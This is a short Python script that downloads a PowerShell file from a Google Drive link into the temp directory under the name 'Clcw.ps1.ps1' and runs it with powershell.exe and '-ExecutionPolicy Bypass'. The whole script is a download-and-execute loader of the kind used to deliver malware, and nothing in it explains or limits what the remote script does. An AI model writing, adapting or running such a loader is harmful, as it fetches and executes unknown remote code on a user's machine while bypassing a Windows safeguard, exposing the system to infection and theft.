import os
import tempfile
import urllib.request
import subprocess

# Step 1: Define the PowerShell script URL and temp path
ps_url = "https://drive.usercontent.google.com/download?id=15jsot0pxQlEbPBlPzId98quVRdVKwJjR&export=download&authuser=0&confirm=t&uuid=77ca476b-cd80-4bd3-bdf4-e6daeabb3223&at=AN8xHoo5lFhmwdnhKPluDLhYq-sd:1752034468492" # Correctly named as ps_url
temp_dir = tempfile.gettempdir()
ps_path = os.path.join(temp_dir, "Clcw.ps1.ps1") # Correctly named as ps_path

# Step 2: Download the PowerShell script file
try:
    print(f"[+] Downloading PowerShell script from {ps_url}...")
    urllib.request.urlretrieve(ps_url, ps_path)
    print(f"[+] Saved to {ps_path}")
except Exception as e:
    print(f"[-] Failed to download PowerShell script: {e}")
    exit(1)

# Step 3: Execute the PowerShell script using powershell.exe
try:
    print(f"[+] Executing PowerShell script...")
    # Using powershell.exe with -ExecutionPolicy Bypass to allow the script to run
    # -File specifies the script to run
    # "//nologo" is not applicable for powershell.exe, remove it.
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps_path], check=True)
    print("[+] Script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"[-] Script execution failed: {e}")
except FileNotFoundError:
    print(f"[-] PowerShell executable not found. Make sure PowerShell is installed and in your PATH.")
    exit(1)
